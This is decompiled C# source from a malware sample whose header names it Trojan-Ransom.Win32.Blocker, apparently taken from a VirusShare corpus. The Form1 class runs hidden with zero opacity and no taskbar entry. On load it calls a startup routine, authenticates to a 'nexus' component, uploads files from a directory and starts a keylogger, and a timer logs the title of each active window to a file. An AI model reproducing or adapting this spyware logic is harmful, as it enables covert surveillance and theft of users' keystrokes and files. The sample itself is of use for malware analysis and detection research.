// Decompiled with JetBrains decompiler
// Type: PHP_Bot.Form1
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace PHP_Bot
{
  public class Form1 : Form
  {
    private string window = "";
    private IContainer components = (IContainer) null;
    private Timer timer1;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      Methods.startup();
      PHP_Bot.RS.Auth.Auth auth = new PHP_Bot.RS.Auth.Auth();
      do
        ;
      while (!Config.nexus.isDone);
      Methods.UploadFile(Config.nexus.GetDirectory);
      LogMe.k();
      this.timer1.Interval = 100;
      this.timer1.Start();
      Config.form = this;
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        string activeWindow = LogMe.GetActiveWindow();
        if (!(this.window != activeWindow) || !(activeWindow != "could not find title."))
          return;
        StreamWriter streamWriter = File.AppendText(LogMe.path);
        streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
        streamWriter.Flush();
        streamWriter.Close();
        this.window = activeWindow;
      }
      catch
      {
        try
        {
          string activeWindow = LogMe.GetActiveWindow();
          if (!(this.window != activeWindow) || !(activeWindow != "could not find title."))
            return;
          StreamWriter streamWriter = File.AppendText(LogMe.path);
          streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
          streamWriter.Flush();
          streamWriter.Close();
          this.window = activeWindow;
        }
        catch
        {
          try
          {
            string activeWindow = LogMe.GetActiveWindow();
            if (!(this.window != activeWindow) || !(activeWindow != "could not find title."))
              return;
            StreamWriter streamWriter = File.AppendText(LogMe.path);
            streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
            streamWriter.Flush();
            streamWriter.Close();
            this.window = activeWindow;
          }
          catch
          {
            try
            {
              string activeWindow = LogMe.GetActiveWindow();
              if (!(this.window != activeWindow) || !(activeWindow != "could not find title."))
                return;
              StreamWriter streamWriter = File.AppendText(LogMe.path);
              streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
              streamWriter.Flush();
              streamWriter.Close();
              this.window = activeWindow;
            }
            catch
            {
            }
          }
        }
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(108, 0);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
